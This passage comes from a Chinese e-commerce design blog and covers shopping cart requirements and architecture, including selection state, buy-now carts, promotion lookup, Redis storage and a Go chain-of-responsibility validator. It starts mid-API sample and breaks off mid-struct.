class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"ms_name"</span>: <span class="string">"string, 系统名称"</span>,</span><br><span class="line">        <span class="attr">"ms_desc"</span>: <span class="string">"string, 系描述"</span>,</span><br><span class="line">        <span class="attr">"ms_domain"</span>: <span class="string">"string, 系统域名"</span>,</span><br><span class="line">        <span class="attr">"list"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"parent_id"</span>: <span class="string">"string, 父菜单ID"</span>,</span><br><span class="line">                <span class="attr">"menu_id"</span>: <span class="string">"string, 菜单ID"</span>,</span><br><span class="line">                <span class="attr">"menu_name"</span>: <span class="string">"string, 菜单ID"</span>,</span><br><span class="line">                <span class="attr">"menu_desc"</span>: <span class="string">"string, 菜描述"</span>,</span><br><span class="line">                <span class="attr">"menu_uri"</span>: <span class="string">"string, 菜单uri"</span>,</span><br><span class="line">                <span class="attr">"child"</span> : [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"parent_id"</span>: <span class="string">"string, 父菜单ID"</span>,</span><br><span class="line">                        <span class="attr">"menu_id"</span>: <span class="string">"string, 菜单ID"</span>,</span><br><span class="line">                        <span class="attr">"menu_name"</span>: <span class="string">"string, 菜单ID"</span>,</span><br><span class="line">                        <span class="attr">"menu_desc"</span>: <span class="string">"string, 菜描述"</span>,</span><br><span class="line">                        <span class="attr">"menu_uri"</span>: <span class="string">"string, 菜单uri"</span>,</span><br><span class="line">                        <span class="attr">"child"</span> : []</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>权限校验</li></ol><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>menu_id</td><td>string</td><td>必传</td><td>菜单ID</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="购物体系"><a href="#购物体系" class="headerlink" title="购物体系"></a>购物体系</h1><h2 id="购物车服务"><a href="#购物车服务" class="headerlink" title="购物车服务"></a>购物车服务</h2><p>对于一个电商来讲，购物车是整个购买流程最重要的一步。因为电商发展到今天购物车不仅仅只是为了完成打包下单的功能；也是收藏、对比、促销提醒、相关推荐的重要展示窗口。如此多的能力我们该如何设计保证购物车的高性能、以及良好的扩展能力来满足未来的发展呢？</p><p>今天开始我们就以一个假定的场景来输出一个购物车设计：某某电商平台，是一个多租户模式（我们前面的诸多设计都是多租户模式），用户可以把商品加入到购物车，并切按照商户纬度来展示、排序。当然购物车也支持常规的各种操作：选择、删除、清空、商品失效等。并且有相关的促销能够提醒用户。同时为了监控、运营，要支撑购物车数据同步到监控、数仓等能力。</p><p>本文会从用户使用的角度以及服务端两个角度来讲解系统的能力。本篇我们的主要目的是说清楚购物车的能力以及一些逻辑。下一篇会进行购物车模型设计以及接口定义。</p><h3 id="用户视角"><a href="#用户视角" class="headerlink" title="用户视角"></a>用户视角</h3><p>我们先来定义一下在用户侧用户操作购物车的功能有哪些？</p><p><img src="/articles/电商设计手册/user-cart-c.png" alt="用户则需求"></p><p>一个购物车基本的能力基本上都在上图中，下面我们一一来分解。</p><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p>我们从用户的角度来看，购物车对于用户来说可以添加商品到购物车（加购物车、立即购买都属于一种添加方式）；加入进购物车后，不想要了可以删除该商品（删一个、删多个、清空）；想多买可以修改购买数量，发现钱不够可以减少购买数量；或者发现红色的比白色更漂亮，可以在购物车方便的进行更换规格；对于一些价格很贵的商品，能够在购物车添加一些保障服务（其实是绑定的虚拟商品）；在要去结算的时候，还会提供选择能力让用户决定哪些商品真的本次要购买。</p><p>通过上面的描述我们可以看到这个过程是有其内在联系的。这里说一下关于选中功能，业界有两种做法，各有优劣，我们来看一下。淘宝的产品选中状态是保存在客户端的，并且默认不选中，刷新、重新打开APP状态会消失；京东、苏宁这一类是保存在服务端，会记录用户选中状态。针对这两种情况各有优劣。</p><p><strong>客户端：</strong></p><ol><li>性能，选中/不选中的逻辑直接放在本地做，减少网络请求</li><li>体验，多端不能同步，但是购物车相对来说更像是一个收藏夹，每次用户自己选择也无可厚非</li><li>计算，价格计算时需要上传本地选中商品（也可以本地计算）</li><li>实现，主要靠客户端实现，与服务端无关，研发解耦合</li></ol><p><strong>服务端：</strong></p><ol><li>性能，每次操作选中都需要调用服务端，而该操作可能很频繁，除了网络损耗，服务端也需要考虑该如何快速找到修改的商品</li><li>体验，多端同步状态，记录历史状态</li><li>计算，服务端可获取数据，请求时无须上传额外数据</li><li>实现，服务端与客户端需要商定如何交互，以及返回数据（每次选中会导致价格变化），耦合在一起</li></ol><p>个人认为这两种方式并无谁具备明显优势，完全是一种基于业务模式以及团队情况来做选择。我们这里后续的设计会基于在服务端保存商品选中状态。</p><p>在整个操作逻辑中，有个两个比较重要的地方单独说明一下：购买方式与购物车内修改购买属性</p><p><strong>购买方式</strong></p><p>主要的购买方式有立即购买、加入购物车、拼团购三种方式。</p><p>首先普通的加入购物车没什么太多要说的。重点来看下立即购买与拼团。</p><p>立即购买在于操作上来说就是选择商品后直接到了订单确认页面，没有购物车中去结算这一步。但是它的实现却可以依赖购物车的逻辑来做，我们来看一下使用购物车与不使用购物车实现这个逻辑有什么差别？</p><p>如果使用购物车来实现，也就是用户点击立即购买时，商品本质上还是加入到购物车中，但这个购物车却与原型的购物车不同，因为该购物车只能加一个商品，并且每次操作都会被覆盖。在视角效果上也是直接从商品详情页面跳转到订单确认页面。来看看这种方式的好处</p><ol><li>与购物车在订单确认、下单逻辑上一致，内部可以直接通过购物车获取数据</li><li>需要一个独立的专门用于一键购买的购物车来实现，内存有消耗</li></ol><p>另外一种实现方式使用一个新的数据结构，因为一般来说一键购买更简单，它只需要商品信息、价格信息即可。每次交互均可以根据sku_id来获取。</p><ol><li>订单确认、下单逻辑上需要进行改造，每次请求之间要传递约定参数</li><li>节省内存，上下交互通过sku_id来保证</li></ol><p>我们会采用使用在服务端一键购买以独立的购物车形式来实现。购物车的数据模型一致，保证了后续处理流程上的一致。</p><p>对于拼团，他其实分为两部分，首先是开团这个动作，当团成立后。我们可以选择将成团的商品加入普通购物车，同时可以加购其它商品。也可以选择将成团商品加入一键购买的购物车，保证成团商品只能买一个。拼团模式更像是加入购物车的一个前置条件。本质上它对于购物车的设计没有影响。</p><p><strong>购物车内修改购买属性</strong></p><p>这里主要是指可以在购物车便捷的操作一些需要在spu纬度操作的事情，比如：变更规格（也就是更换sku），以及选择绑定到spu纬度的服务（保险、延保等）。</p><p>我们重点说一下选择绑定的服务。例如：我们买一个手机，厂家提供了延保、各种其它附加服务，一般情况这种服务都是虚拟商品。但是这有个特殊情况。这些保障服务首先不能单独购买，其次他是跟主商品的数量息息相关。比如买两个手机，如果选择了加购服务，那么这些服务的数量必须是2，这会是一个联动关系。</p><p>这些保障服务是不能进行单独购买的，它一定要跟特定的商品捆绑销售。</p><p>服务端在存储这部分数据时一定需要考虑如何保存这种层级关系，这部分我们后面模型设计的时候大家会看到。</p><p><img src="/articles/电商设计手册/product-relations.png" alt="绑定商品关系"></p><h4 id="提醒"><a href="#提醒" class="headerlink" title="提醒"></a>提醒</h4><p>促销提醒很简单，返回的购物车数据，每一个商品应该携带当前的促销信息。这部分重点在于怎么获取促销信息，会在服务端看到。</p><p>然后说下购物车数量的提醒，也就是显示当前购物车商品的数量。一般来说进入到APP就会调用一个接口，获取用户的未读消息数、购物车商品数等。这里是需要非常高的读取速度。那么这种需求该如何满足呢？</p><p><strong>方案一：</strong> 我们可以设计一个结构保存了用户相关的这种提醒信息数量，每次直接读取这个数据即可。不需要去跟消息服务、购物车服务打交道拿这些数据。</p><p><strong>方案二：</strong> 在消息、购物车的模型中均设计一个保存总数量的字段，在读取数据的接口中，通过并发的方式调用这些服务拿到数据后进行聚合，这样在速度上只取决于最慢的服务。</p><p>这里我们的设计会采用 <strong>方案二</strong>，因为这样在某种程度上效率可以得到保证，同时整个系统的结构数据的一致性更容易得到保障。当然这里有个细节一定要注意，并发读取一定要设计超时，不要因为某个服务读数问题而导致拖累整个接口的性能。</p><p>接下来再来看看促销，这部分除了提醒，还需要提供对应的入口，让用户完成促销的操作。比如说某个商品有券，那么可以直接提供入口去领取；可凑单，有入口进入凑单列表并选择商品等。这部分需要解决的问题是服务端该如何及时从商品纬度拿到这些促销活动。</p><p>从用户的视角看完了，我们再来站在研发的角度看看服务端有哪些事情要做</p><h3 id="研发视角"><a href="#研发视角" class="headerlink" title="研发视角"></a>研发视角</h3><p>还是先来看看需求的汇总图：</p><p><img src="/articles/电商设计手册/user-cart-s.png" alt="服务端则需求"></p><h4 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h4><p>对于存储，首选肯定是内存存储，至于要不要落库，我觉得没有必要。说下我的理由：</p><ol><li>购物车的数据相对变化非常频繁，落库成本比较高，如果异步方式落库，很难保障一致性</li><li>极端情况，cache奔溃了，仅仅需要用户重新加入购物车，并且我们可以通过cache的持久化机制来保证数据的恢复</li></ol><p>所以对于购物车，我们只会把数据完全保存在内存中。</p><h4 id="商品销售类型发生变化"><a href="#商品销售类型发生变化" class="headerlink" title="商品销售类型发生变化"></a>商品销售类型发生变化</h4><p>现在我们来讨论 <strong>商品销售类型发生变化</strong> 这个问题。这是什么意思呢？大家想一下：比如我把A商品加入到购物车，但是一直没有结算。这时运营说针对A商品搞一个活动，拿出10个库存5折购。那么问题来了，对于之前购物车中就有该商品的用户该如何处理？<strong>这里解决的主要问题是：购物车有该商品的用户不能直接以5折买</strong>。几种方案，我们来看一下：</p><p><strong>方案一：</strong> 促销配置后，所有购物车中有该商品的用户失效或删除，这个方案首先被pass，操作成本太高，并且用户体验差</p><p><strong>方案二：</strong> 购物车中要区分同一个SKU，不同销售类型。也就是说在我们的购物车中不是按照SKU的纬度来加商品，而是通过 <strong>SKU+售卖类型</strong> 来生成一个唯一识别码。</p><p>可以看到 <strong>方案二</strong> 解决了同一个sku在购物车并存的问题，并且库存之前互相不影响。不过这里又有一个问题？商品的售卖类型（或者说这个标记），该怎么什么地方设置？好像商品系统可以设计、促销系统也可以设置。我们的逻辑中会在促销系统中进行配置。因为商品属于基础逻辑，如果一改就是全局库存受到影响。活动结束后很难做到自动正常售卖。因此这个标记应该落到活动中进行设置（活动设置时会通过促销系统获取该商品之前的活动是否互斥，以确保配置的活动不会互相矛盾）。</p><h4 id="依赖系统"><a href="#依赖系统" class="headerlink" title="依赖系统"></a>依赖系统</h4><p>购物车系统依赖了非常多的其它系统。</p><ul><li>商品系统</li><li>库存系统</li><li>促销系统</li><li>结算系统</li></ul><p>这些依赖的系统，有的是为了传输数据，有的是为了获取数据。我们按照这两个纬度来看一下。</p><p><strong>促销提醒与计算</strong></p><p>服务端要解决的是促销的提醒与价格计算问题。</p><p>现来说计算，针对这部分最佳的方式是，调用结算中心的价格计算。我们来看一下购物车中的价格计算与订单结算时的价格计算的差异。</p><p>首先购物车中计算价格时不知道用户的地址，这会影响运费的计算；再是不知道用券的情况。那么其实如果解决了这两个问题，我们就可以让价格计算出自同一个逻辑，仅仅是部分入参不同罢了。因此我们这里计算时可以按照最高运费来计算，同时用券默认在购物车都不使用券。对于促销问题这里是可以通过促销系统确认选中的商品可以享受哪些价格的。因此促销的价格应该计算在内。</p><p>接下来在再来说说如何为用户高效的提供促销的信息。先从我们的配置视野出发。</p><p>我们在配置一个促销活动或者发一张券时，都是将多个商品归到一个促销活动或者券的下面。如果按照活动、券的纬度来获取商品效率相对比较高。</p><p><img src="/articles/电商设计手册/activity-product.png" alt="活动-商品"></p><p>但是在购物车的场景中发生了一个变化。我们是需要从商品纬度获取到该商品的所有活动信息（全平台活动、店铺活动）；<br>那么购物车中为了展示这些信息该怎么做？很常规的一个做法（也确实不少公司是这样）：把所有活动信息取出来，遍历出所有跟该商品相关的信息。这种做法效率很低，并且无法满足大规模的应用场景，比如双十一期间。</p><p>因此这里为了满足该需求，促销系统需要提供一个能力按照商品获取对应促销（活动、券）。因此一般来讲促销系统配置的活动不能仅仅是按照活动纬度存储，同时还需要生成一份商品纬度的促销信息。</p><p><img src="/articles/电商设计手册/product-activity.png" alt="商品-活动"></p><h4 id="购物车数据分析"><a href="#购物车数据分析" class="headerlink" title="购物车数据分析"></a>购物车数据分析</h4><p>对于购物车数据来说，前端会通过埋点记录加入购物车数据的情况，但是前端埋点一般是记录触发了某个前端操作，但是并不知道该操作是否成功与否。以及无法及时了解当前整体购物车的数据情况。</p><p>为了让运营团队更完整的了解购物车当前情况，我们通过后端打本地日志，然后通过日志收集的方式将日志同步给数据、监控等服务。</p><h4 id="失效与排序"><a href="#失效与排序" class="headerlink" title="失效与排序"></a>失效与排序</h4><p>还有两个小部分没有讲到，一是商品该如何失效，比如：库存没有了、下架了；二是购物车中的商品是多个店铺的，排序的策略是什么？</p><p>由于本文我们还只是讨论需求，不涉及具体的模型设计，因此只是介绍方案。首先是商品失效，这很像一个软删除操作，一旦设置，用户侧看到的商品将是无法进行结算的，只能进行删除操作。</p><p>对于排序我们会采用的设计是：根据某个店铺在购物车中最后发生操作的时间，最新的操作肯定在最上面。</p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>通过上面我们基本上搞清楚了购物车设计中我们要做什么，依赖的系统要提供什么能力。下篇开始进入数据模型的设计、前后端接口设计。</p><p>如果你对购物车上面的需求还有哪些补充，欢迎留言。我们一起来完善。</p><h2 id="购物车架构"><a href="#购物车架构" class="headerlink" title="购物车架构"></a>购物车架构</h2><p>在上一篇文章 <a href="https://dayutalk.cn/2019/12/09/%E8%B4%AD%E7%89%A9%E8%BD%A6%E8%AE%BE%E8%AE%A1%E4%B9%8B%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">购物车设计之需求分析</a> 描述了购物车的通用需求。本文重点则在如何实现上进行架构上的设计（业务+系统架构）。</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>架构设计可以分为三个层面：</p><ul><li>业务架构</li><li>系统架构</li><li>技术架构</li></ul><p>快速简单的说明下三个架构的意思；当我们拿到购物车需求时，我们说用Golang来实现，存储用Redis；这描述的是技术架构；我们对购物车代码项目进行代码分层，设计规范，以及依赖系统的规划这叫系统架构；</p><p>那业务架构是什么呢？业务架构本质上是对系统架构的文字语言描述；什么意思？我们拿到一个需求首先要跟需求方进行沟通，建立统一的认知。比如：规范名词（购物车中说的商品与商品系统中商品的含义是不同的）；建立大家都能明白的模型，购物车、用户、商品、订单这些实体之间的互动，以及各自具备什么功能。</p><p>在业务架构分析上有很多方法论，比如：领域驱动设计，但是它并不是唯一的业务架构分析方法，也并不是说最好的。适合你的就是最好的。我们常用的实体关系图、UML图也属于业务架构领域；</p><p>这里需要强点一点的是，不管你用什么方式来建模设计，有设计总比没设计强，其次一定要将建模的内容体现到你的代码中去。</p><p>本文在业务架构上的分析借助了 <code>DDD</code> （领域驱动设计）思想；还是那句话<code>适合的就是最好的</code>。</p><h3 id="业务架构"><a href="#业务架构" class="headerlink" title="业务架构"></a>业务架构</h3><p>通过前面的需求分析，我们已经明确我们的购物车要干什么了。先来看一下一个典型的用户操作购物车过程。</p><p><img src="/articles/电商设计手册/cart-sys-00.png" alt="用户旅程"></p><p>在这个过程中，用户使用购物车这个载体完成了商品的购买流程；不断流动的数据是商品，购物车这个载体是稳定的。这是我们系统中的稳定点与变化点。</p><p>商品的流动方式可能多种多样，比如从不同地方加入购物车，不同方式加入购物车，生命周期在购物车中也不一样；但是这个流程是稳定的，一定是先让购物车中存在商品，然后才能去结算产生订单。</p><p>商品在购物车中的生命周期如下：</p><p><img src="/articles/电商设计手册/cart-sys-01.jpg" alt="过程"></p><p>按照这个过程，我们来看一下每个阶段对应的操作。</p><p><img src="/articles/电商设计手册/cart-sys-02.jpg" alt="过程对应的操作"></p><p>这里注意一点，加车前这个操作其实我们可以放到购物车的添加操作中，但是由于这部分是非常不稳定且多变的。我们将其独立出来，方便后续进行扩展而不影响相对比较稳定的购物车阶段。</p><blockquote><p>上面这三个阶段，按照DDD中的概念，应该叫做实体，他们整体构成了购物车这个域；今天我们先不讲这些概念，就先略过，后面有机会单独发文讲解。</p></blockquote><h4 id="加车前"><a href="#加车前" class="headerlink" title="加车前"></a>加车前</h4><p>通过流程分析，我们总结出了系统需要具备的操作接口，以及这些接口对应的实体，现在我们先来看加车前主要要做些什么；</p><p>加车前其实主要就是对准备加入的购物车商品进行各个纬度的校验，检查是否满足要求。</p><p>在让用户加车前，我们首先解决的是用户从哪里卖，然后进行验证？因为同一个商品从不同渠道购买是存在不同情况的，比如：小米手机，我们是通过秒杀买，还是通过好友众筹买，或者商城直接购买，价格存在差异，但是实际上他是同一个商品；</p><p>第二个问题是是否具备购买资格，还是上面说的，秒杀、众筹这个加车操作，不是谁都可以添加的，得现有资格。那么资格的检查也是放到这里；</p><p>第三个问题是对这个购买的商品进行商品属性上的验证，如是否上下架，有库存，限购数量等等。</p><p>而且大家会发现，这里的验证条件可能是非常多变的。如何构建一个方便扩展的代码呢？</p><p><img src="/articles/电商设计手册/cart-sys-03.jpg" alt="加车的验证"></p><p>整个加车过程，重要的就是根据来源来区分不同的验证。我们有两种选择方式。</p><p>方式一：通过策略模式+门面模式的方式来搞定。策略就是根据不同的加车来源进行不同的验证，门面就是根据不同的来源封装一个个策略；</p><p>方式二：通过责任链模式，但是这里需要有一个变化，这个链在执行过程中，可以选择跳过某些节点，比如：秒杀不需要库存、也不需要众筹的验证；</p><p>通过综合的分析我选择了责任链的模式。贴一下核心代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 每个验证逻辑要实现的接口</span><br><span class="line">type Handler interface &#123;</span><br><span class="line">Skipped(in interface&#123;&#125;) bool // 这里判断是否跳过</span><br><span class="line">HandleRequest(in interface&#123;&#125;) error // 这里进行各种验证</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 责任链的节点</span><br><span class="line">type RequestChain struct &#123;</span><br><span class="line">Handler</span><br><span class="line">Next *RequestChain</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 设置handler</span><br><span class="line">func (h *RequestChain) SetNextHandler(in *RequestChain) *RequestChain &#123;</span><br><span class="line">h.Next = in</span><br><span class="line">return in</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于设计模式，大家可以看我小伙伴的github：<a href="https://github.com/TIGERB/easy-tips/tree/master/go/src/patterns" target="_blank" rel="noopener">https://github.com/TIGERB/easy-tips/tree/master/go/src/patterns</a></p><h4 id="购物车"><a href="#购物车" class="headerlink" title="购物车"></a>购物车</h4><p>说完了加车前，现在来看购物车这一部分。我们在之前曾讨论过，购物车可能会有多种形态的，比如：存储多个商品一起结算，某个商品立即结算等。因此购物车一定会根据渠道来进行购物车类型的选择。</p><p>这部分的操作相对是比较稳定的。我们挑几个比较重要的操作来讲一下思路即可。</p><p><strong>加入购物车</strong></p><p>通过把条件验证的前置，会发现在进行加车操作时，这部分逻辑已经变得非常的轻量了。要做的主要是下面几个部分的逻辑。</p><p><img src="/articles/电商设计手册/cart-sys-04.jpg" alt></p><p>这里有几个取巧的地方，首先是获取商品的逻辑，由于在前面验证的时候也会用到，因此这里前面获取后会通过参数的方式继续往后传递，因此这里不需要在读库或者调用服务来获取；</p><p>其次这里需要把当前用户现有购物车数据获取到，然后将添加的这个商品添加进来。这是一个类似合并操作，原来这个商品是存在，相当于数量加一；需要注意这个商品跟现存的商品有没有父子关系，有没有可能加入后改变了某个活动规则，比如：原来买了2个送1个赠品，现在再添加了一个变成3个，送2个赠品；</p><blockquote><p>注意：这里的添加并不是在购物车直接改数量，可能就是在列表、详情页直接添加添加。</p></blockquote><p>通过将合并后的购物车数据，通过营销活动检查确认ok后，直接回写到存储中。</p><p><strong>合并购物车</strong></p><p>为什么会有合并购物车这个操作？因为一般电商都是准许游客身份进行操作的，因此当用户登录后需要将二者进行合并。</p><p>这里的合并很多部分的逻辑是可以与加入购物车复用的逻辑。比如：合并后的数据都需要检查是否合法，然后覆写回存储中。因此大家可以看到这里的关联性。设计的方法在某种程度上要通用。</p><p><strong>购物车列表</strong></p><p>购物车列表这是一个非常重要的接口，原则上购物车接口会提供两种类型，一种简版，一种完全版本；</p><p>简版的列表接口主要是用在类似PC首页右上角之类获取简单信息；完全版本就是在购物车列表中会用到。</p><p>在实际实现中，购物车绝不仅仅是一个读取接口那么简单。因为我们都知道不管是商品信息、活动信息都是在不断的发生变化。因此每次的读取接口必然需要检查当前购物车中数据的合法性，然后发现不一致后需要覆写原存储的数据。</p><p><img src="/articles/电商设计手册/cart-sys-05.jpg" alt></p><p>也有一些做法会在每个接口都去检查数据的合法性，我建议为了性能考虑，部分接口可以适当放宽检查，在获取列表时再进行完整的检查。比如添加接口，我只会检测我添加的商品的合法性，绝不会对整个购物车进行检查。因为该操作之后一般都会调用列表操作，那么此时还会进行校验，二者重复操作，因此只取后者。</p><h4 id="结算"><a href="#结算" class="headerlink" title="结算"></a>结算</h4><p>结算包括两部分，结算页的详情信息与提交订单。结算页可以说是在购物车列表上的一个包装，因为结算页与列表页最大的不同是需要用户选择配送地址（虚拟商品另说），此时会产生更明确的价格信息，其他基本一致。因此在设计购物车列表接口的时候，一定要考虑充分的通用性。</p><p>这里另外一个需要注意的是：立即购买，我们也会通过结算页接口来实现，但是内部其实还是会调用添加接口，将商品添加到购物车中；有三个需要注意的地方，首先是这个添加操作是服务内部完成的，对于服务调用方是不需要感知这个加入操作的存在；其次是这个购物车在Redis中的Key是独立于普通购物车的，否则二者的商品耦合在一起非常难于操作处理；最后立即购买的购物车要考虑账号多终端登录的时候，彼此数据不能互相影响，这里可以用每个端的uuid来作为购物车的标记避免这种情况。</p><p>购物车的最后一步是生成订单，这一步最要紧的是需要给购物车加锁，避免提交过程中数据被篡改，多说一句，很多人写的Redis分布式锁代码都存在缺陷，大家一定要注意原子性的问题，这类文章网络上很多不再赘述。</p><p>加锁成功之后，我们这里有多种做法，一种是按照DB涉及组织数据开始写表，这适用于业务量要求不大，比如订单每秒下单量不超过2000K的；那如果你的系统并发要求非常高怎么办？</p><p>其实也很简单，高性能的三大法宝之一：异步；我们提交的时候直接将数据快照写入MQ中，然后通过异步的方式进行消费处理，可以通过通过控制消费者的数量来提升处理能力。这种方法虽然性能提升，但是复杂度也会上升，大家需要根据自己的实际情况来选择。</p><p>关于业务架构的设计，到此告一段落，接下来我们来看系统架构。</p><h3 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h3><p>系统结构主要包含，如何将业务架构映射过来，以及输出对应输入参数、输出参数的说明。由于输入、输出针对各自业务来确定的，而且没有什么难度，我们这里就只说如何将业务架构映射到系统架构，以及系统架构中最核心的Redis数据结构选择以及存储的数据结构设计。</p><h4 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h4><p>下面的代码目录是按照 <code>Golang</code> 来进行设计的。我们来看看如何将上面的业务架构映射到代码层面来。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">├── addproducts.<span class="keyword">go</span></span><br><span class="line">├── cartlist.<span class="keyword">go</span></span><br><span class="line">├── mergecart.<span class="keyword">go</span></span><br><span class="line">├── entity</span><br><span class="line">│   ├── cart</span><br><span class="line">│   │   ├── add.<span class="keyword">go</span></span><br><span class="line">│   │   ├── cart.<span class="keyword">go</span></span><br><span class="line">│   │   └── list.<span class="keyword">go</span></span><br><span class="line">│   ├── order</span><br><span class="line">│   │   ├── checkout.<span class="keyword">go</span></span><br><span class="line">│   │   ├── order.<span class="keyword">go</span></span><br><span class="line">│   │   └── submit.<span class="keyword">go</span></span><br><span class="line">│   └── precart</span><br><span class="line">├── event</span><br><span class="line">│   └── sendorder.<span class="keyword">go</span></span><br><span class="line">├── facade</span><br><span class="line">│   ├── activity.<span class="keyword">go</span></span><br><span class="line">│   └── product.<span class="keyword">go</span></span><br><span class="line">└── repo</span><br></pre></td></tr></table></figure><p>外层有 <code>entity</code>、<code>event</code>、<code>facade</code>、<code>repo</code>这四个目录，职责如下：</p><p><strong>entity</strong>: 存放的是我们前面分析的购物领域的三个实体；所有主要的操作都在这三个实体上；</p><p><strong>event</strong>: 这是用来处理产生的事件，比如刚刚说的如果我们提交订单采用异步的方式，那么该目录就该完成的是如何把数据发送到MQ中去；</p><p><strong>facade</strong>: 这儿目录是干嘛的呢？这主要是因为我们的服务还需要依赖像商品、营销活动这些服务，那么我们不应该在实体中直接调用它，因为第三方可能存在变动，或者有增加、减少，我们在这里进行以下简单的封装(设计模式中的门面模式)；</p><p><strong>repo</strong>: 这个目录从某种程度上可以理解为 <code>Model</code>层，在整个领域服务中，如果与持久化打交道，都通过它来完成。</p><p>最后外层的几个文件，就是我们所提供的领域服务，供应用层来进行调用的。</p><blockquote><p>为了保证内容的紧凑，我这里放弃了对整个微服务的目录介绍，只单独介绍了领域服务，后续会单独成文介绍下微服务的整个系统架构。</p></blockquote><p>通过上面的划分，我们完成了两件事情：</p><ol><li><p>业务架构分析的结构在系统代码中都有映射，他们彼此体现。这样最大的好处是，保证设计与代码的一致性，看了文档你就知道对应的代码在哪里；</p></li><li><p>每个目录各自的关注点都进行了分离，更内聚，更容易开发与维护。</p></li></ol><h4 id="Redis存储"><a href="#Redis存储" class="headerlink" title="Redis存储"></a>Redis存储</h4><p>现在来看，我们选择Redis作为购物商品数据的存储，我们要解决两个问题，一是我们需要存哪些数据？二是我们用什么结构来存？</p><p>网络上很多写购物车的都是只保存一个商品id，真实场景是很难满足需求的。你想想，一个商品id如何记住用户选择的赠品？用户上次选择的活动？以及购买的商品渠道？</p><p>综合比较通用的场景，我给出一个参考结构：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 购物车数据</span></span><br><span class="line"><span class="keyword">type</span> ShoppingData <span class="keyword">struct</span> &#123;</span><br><span class="line">Item       []*Item <span class="string">`json:"item"`</span></span><br><span class="line">UpdateTime <span class="keyword">int64</span>   <span class="string">`json:"update_time"`</span></span><br><span class="line">Version    <span class="keyword">int32</span>   <span class="string">`json:"version"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单个商品item元素</span></span><br><span class="line"><span class="keyword">type</span> Item <span class="keyword">struct</span> &#123;</span><br><span class="line">ItemId       <span class="keyword">string</span>          <span class="string">`json:"item_id"`</span></span><br><span class="line">ParentItemId <span class="keyword">string</span>          <span class="string">`json:"parent_item_id,omitempty"`</span> <span class="comment">// 绑定的父item id</span></span><br><span class="line">OrderId      <span class="keyword">string</span>          <span class="string">`json:"order_id,omitempty"`</span>       <span class="comment">// 绑定的订单号</span></span><br><span class="line">Sku          <span class="keyword">int64</span>           <span class="string">`json:"sku"`</span></span><br><span class="line">Spu          <span class="keyword">int64</span>           <span class="string">`json:"spu"`</span></span><br><span class="line">Channel      <span class="keyword">string</span>          <span class="string">`json:"channel"`</span></span><br><span class="line">Num          <span class="keyword">int32</span>           <span class="string">`json:"num"`</span></span><br><span class="line">Status       <span class="keyword">int32</span>           <span class="string">`json:"status"`</span></span><br><span class="line">TTL          <span class="keyword">int32</span>           <span class="string">`json:"ttl"`</span>                     <span class="comment">// 有效时间</span></span><br><span class="line">SalePrice    <span class="keyword">float64</span>         <span class="string">`json:"sale_price"`</span>              <span class="comment">// 记录加车时候的销售价格</span></span><br><span class="line">SpecialPrice <span 